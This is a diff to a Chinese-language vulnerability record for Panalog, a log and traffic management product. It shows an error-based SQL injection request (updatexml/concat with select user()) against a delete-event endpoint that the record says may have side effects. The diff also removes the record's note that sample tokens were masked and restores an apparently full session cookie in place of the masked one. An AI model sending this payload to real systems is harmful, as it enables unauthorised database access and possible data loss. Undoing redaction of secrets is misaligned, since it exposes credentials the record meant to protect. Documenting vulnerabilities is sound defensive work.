@@ -37,7 +37,6 @@ source_status: "recorded"
 - 仅注入及基线请求无响应差异，认证要求未明确
 - 删除事件接口可能有副作用，未说明；fofa误录Hunter残缺字段
 - 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
-- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断
 
 ### 操作风险与恢复
 
@@ -66,7 +65,7 @@ panalog为北京派网软件有限公司，一款流量分析，日志分析管�
 ```http
 GET /Maintain/sprog_deletevent.php?openid=1&id=1%20or%20updatexml(1,concat(0x7e,(select+user())),0)&cloudip=1 HTTP/1.1
 Host: {hostname}
-Cookie: PHPSESSID=h5i********************355
+Cookie: PHPSESSID=h5inhsqh9heas1lovb1f5kd355
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
@@ -84,7 +83,7 @@ Connection: close
 ```http
 GET /Maintain/sprog_deletevent.php?openid=1&id=1&cloudip=1 HTTP/1.1
 Host: {hostname}
-Cookie: PHPSESSID=h5i********************355
+Cookie: PHPSESSID=h5inhsqh9heas1lovb1f5kd355
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
